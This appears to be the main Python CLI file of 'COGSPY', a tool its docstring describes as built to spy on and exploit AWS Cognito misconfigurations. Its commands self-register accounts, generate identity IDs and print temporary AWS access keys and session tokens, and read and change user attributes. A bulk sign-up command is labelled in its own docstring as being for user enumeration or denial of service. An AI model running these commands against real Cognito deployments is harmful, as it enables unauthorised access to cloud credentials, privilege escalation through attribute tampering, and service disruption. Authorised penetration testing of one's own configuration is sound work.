import click
from core import CognitoFuncs
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter

@click.group()
def cli():
    """
    \n\n\n\n\n\n\n\n
    COGSPY - Spy and exploit some aws cognito missconfigurations.
    \n
    Author: rodnt\n
    Version: 1.1\n 
    """
    pass

@cli.command()
@click.option('--username', required=True, help='Username for the new Cognito user.')
@click.option('--email', required=True, help='Email for the new Cognito user.')
@click.option('--password', required=True, help='Password for the new Cognito user.')
@click.option('--region', required=True, help='AWS region for the Cognito service. EX: us-east-1')
@click.option('--client-id', required=True, help='The Client ID of your AWS Cognito User Pool. EX: 6j3tkib2pXXXXXXXXXXXXXXXXX')
@click.option('--pool-id', required=False, help='The Pool ID of your AWS Cognito User Pool. EX: us-east-1_pGJbLXXX')
@click.option('--identity-id', required=False, help='The identity Pool ID of your AWS Cognito User Pool. EX: us-east-1:e5ca78d3-0730-4829-9ee0-XXXXXXXXXXXX')
def register(username, password, email, region, client_id, pool_id, identity_id):
    """Register a new user in AWS Cognito."""
    cognito_client = CognitoFuncs.CognitoClient(region=region, client_id=client_id, pool_id=pool_id, identity_id=identity_id)
    click.echo(f'Registering user: {username} in region: {region} with client ID: {client_id}')
    
    cognito_client.sign_up_user(username, password, email)

@cli.command()
@click.option('--username', required=True, help='Username for confirmation.')
@click.option('--confirmation-code', required=True, help='Confirmation code received by the user.')
@click.option('--region', required=True, help='AWS region for the Cognito service.')
@click.option('--client-id', required=True, help='The Client ID of your AWS Cognito User Pool.')
def confirm(username, confirmation_code, region, client_id):
    """Confirm a user's account with the provided confirmation code."""
    cognito_client = CognitoFuncs.CognitoClient(region=region, client_id=client_id)
    cognito_client.confirm_user(username, confirmation_code)
    click.echo(f"[+] Confirming user: {username} with confirmation code: {confirmation_code}")

@cli.command()
@click.option('--identity-id', required=True, help='The Identity Pool ID of your AWS Cognito Identity Pool. EX: us-east-1:xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxx')
@click.option('--region', required=True, help='AWS region for the Cognito service. EX: us-east-1')
def get_identity_id(identity_id, region):
    """Generate an identity ID for the given identity pool."""
    if identity_id == "" or identity_id == None:
        print(f"[!] provide the identity_id with --identity-id and the --region")
    cognito_client = CognitoFuncs.CognitoClient(region=region)
    identity_id = cognito_client.generate_identity_id(identity_id)
    if identity_id:
        click.echo(f"Generated identity ID: {identity_id}")
    else:
        click.echo("Failed to generate identity ID.")

@cli.command()
@click.option('--identity-id', required=True, help='The identity ID for which to retrieve AWS credentials.')
@click.option('--region', required=True, help='AWS region for the Cognito service. EX: us-east-1')
def get_credentials(identity_id, region):
    """Fetch temporary AWS credentials for a given identity ID."""
    cognito_client = CognitoFuncs.CognitoClient(region=region)
    credentials = cognito_client.get_credentials_for_identity(identity_id)
    if credentials:
        click.echo("Temporary AWS Credentials:")
        click.echo(f"Access Key ID: {credentials['AccessKeyId']}")
        click.echo(f"Secret Access Key: {credentials['SecretKey']}")
        click.echo(f"Session Token: {credentials['SessionToken']}")
    else:
        click.echo("Failed to retrieve temporary AWS credentials.")


@cli.command()
@click.option('--access-token', required=True, help='The access token obtained through user authentication.')
@click.option('--region', required=True, help='AWS region for the Cognito service. EX: us-east-1')
def get_user(access_token, region):
    """Fetch user details from Amazon Cognito using an access token."""
    cognito_client = CognitoFuncs.CognitoClient(region=region)
    user_details = cognito_client.get_user_details(access_token)
    if user_details:
        click.echo("User Details:")
        for attribute in user_details.get('UserAttributes', []):
            attr = attribute['Value']
            if 'custom' in attr:
                print(f"[+] Custom value found: {attr}")
            click.echo(f"{attribute['Name']}: {attribute['Value']}")
    else:
        click.echo("Failed to retrieve user details.")

@click.command()
@click.option('--access-token', required=True, help='The access token obtained through user authentication.')
@click.option('--region', required=True, help='AWS region for the Cognito service.')
def change_user_data(access_token, region):
    """Command to update user data in Amazon Cognito."""
    cognito_client = CognitoFuncs.CognitoClient(region=region)
    
    attribute_name = click.prompt("Please enter the attribute you want to update")
    new_value = click.prompt("New Value")
    
    attributes_to_update = [{'Name': attribute_name, 'Value': new_value}]
    
    cognito_client.update_user_attributes(access_token, attributes_to_update)

@click.command()
@click.option('--client-id', required=True, help='The Client ID of your AWS Cognito User Pool.')
@click.option('--usernames-file', required=True, type=click.Path(exists=True), help='Path to the file containing usernames.')
@click.option('--passwords-file', required=True, type=click.Path(exists=True), help='Path to the file containing passwords.')
@click.option('--region', required=True, help='AWS region for the Cognito service.')
def bulk_sign_up(client_id, usernames_file, passwords_file, region):
    """User enumeration OR DOS Bulk sign-up users from separate files for usernames and passwords"""
    cognito_client = CognitoFuncs.CognitoClient(region=region)

    try:
        with open(usernames_file, 'r') as usernames, open(passwords_file, 'r') as passwords:
            for username, password in zip(usernames, passwords):
                username = username.strip()
                password = password.strip()
                try:
                    cognito_client.bulk_sign_up_user(client_id=client_id, username=username, password=password)
                    click.echo(f"[+] User {username} signed up successfully.")
                except Exception as e:  # Consider more specific exception handling
                    if "UserAlreadyExistsException" in str(e):  # Adjust based on the actual exception or error message
                        click.echo(f"[!] User {username} already exists.")
                    else:
                        click.echo(f"An error occurred for user {username}: {e}")
    except FileNotFoundError:
        click.echo("File not found.")
    except Exception as e:
        click.echo(f"An error occurred: {e}")



if __name__ == '__main__':
    cli.add_command(change_user_data)
    cli.add_command(bulk_sign_up)
    cli.add_command(get_user)
    cli.add_command(get_credentials)
    cli.add_command(get_identity_id)
    cli.add_command(confirm)
    cli.add_command(register)
    cli()
